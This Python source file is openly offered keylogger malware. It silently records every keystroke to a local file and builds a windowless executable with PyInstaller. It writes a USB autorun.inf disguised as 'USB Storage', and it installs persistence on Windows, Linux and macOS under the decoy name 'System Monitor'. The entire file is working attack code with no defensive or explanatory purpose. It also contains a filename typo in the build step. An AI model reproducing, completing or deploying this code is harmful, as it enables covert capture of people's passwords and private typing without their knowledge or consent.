# keylogger_tool.py
import os
import sys
import time
import threading
import shutil
from pynput import keyboard
from datetime import datetime
import platform
import subprocess

LOG_FILE = "keylog_output.txt"
USB_AUTORUN_FILE = "autorun.inf"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char') and key.char is not None:
                f.write(f"{key.char}")
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        # Silent error handling for background operation
        pass

def run_keylogger():
    """Run the keylogger silently in background"""
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        # Silent error handling
        pass

def create_usb_autorun():
    """Create autorun.inf file for USB autorun functionality"""
    try:
        autorun_content = """[autorun]
open=keylogger.exe
icon=keylogger.exe
label=USB Storage
action=Open folder to view files
"""
        with open(USB_AUTORUN_FILE, "w") as f:
            f.write(autorun_content)
        return True
    except Exception as e:
        return False

def create_exe():
    """Create executable using PyInstaller"""
    try:
        # Install PyInstaller if not available
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"], 
                      capture_output=True, check=True)
        
        # Create executable
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--noconsole",
            "--name=keylogger",
            "--hidden-import=pynput.keyboard._win32",
            "--hidden-import=pynput.mouse._win32",
            "keylloger.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Copy executable to current directory
            exe_path = os.path.join("dist", "keylogger.exe")
            if os.path.exists(exe_path):
                shutil.copy2(exe_path, "keylogger.exe")
                print("Executable created successfully: keylogger.exe")
                return True
        else:
            print(f"Error creating executable: {result.stderr}")
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def setup_usb_keylogger():
    """Setup complete USB keylogger with autorun"""
    print("Setting up USB keylogger...")
    
    # Create executable
    if create_exe():
        # Create autorun.inf
        if create_usb_autorun():
            print("USB keylogger setup complete!")
            print("Files created:")
            print("- keylogger.exe (executable)")
            print("- autorun.inf (autorun configuration)")
            print("\nCopy these files to your USB drive root directory.")
            print("The keylogger will start automatically when USB is inserted.")
            return True
        else:
            print("Failed to create autorun.inf")
            return False
    else:
        print("Failed to create executable")
        return False

def add_to_startup():
    """Add the script to system startup"""
    try:
        script_path = os.path.abspath(__file__)
        system = platform.system()
        
        if system == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemMonitor", 0, winreg.REG_SZ, 
                             f'pythonw "{script_path}"')
            winreg.CloseKey(key)
            return True
        elif system == "Linux":
            startup_dir = os.path.expanduser("~/.config/autostart")
            os.makedirs(startup_dir, exist_ok=True)
            desktop_file = os.path.join(startup_dir, "system_monitor.desktop")
            with open(desktop_file, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
            return True
        elif system == "Darwin":  # macOS
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.systemmonitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.systemmonitor.plist")
            with open(plist_path, "w") as f:
                f.write(plist_content)
            os.system(f"launchctl load {plist_path}")
            return True
    except Exception as e:
        return False

def main():
    # Check command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--background":
            # Silent background mode
            run_keylogger()
        elif sys.argv[1] == "--install":
            # Install to startup
            if add_to_startup():
                print("Successfully added to system startup")
            else:
                print("Failed to add to system startup")
        elif sys.argv[1] == "--usb-setup":
            # Setup USB keylogger
            setup_usb_keylogger()
        elif sys.argv[1] == "--create-exe":
            # Create executable only
            create_exe()
        else:
            print("Invalid argument. Use --background, --install, --usb-setup, or --create-exe")
    else:
        # Normal mode with user interaction
        print(f"Keylogger started at {datetime.now()}")
        print(f"Logging to: {LOG_FILE}")
        print("Press Ctrl+C to stop")
        print("\nAvailable options:")
        print("--background: Run silently in background")
        print("--install: Add to system startup")
        print("--usb-setup: Create USB autorun keylogger")
        print("--create-exe: Create executable only")
        
        try:
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print("\nKeylogger stopped")

if __name__ == "__main__":
    main()
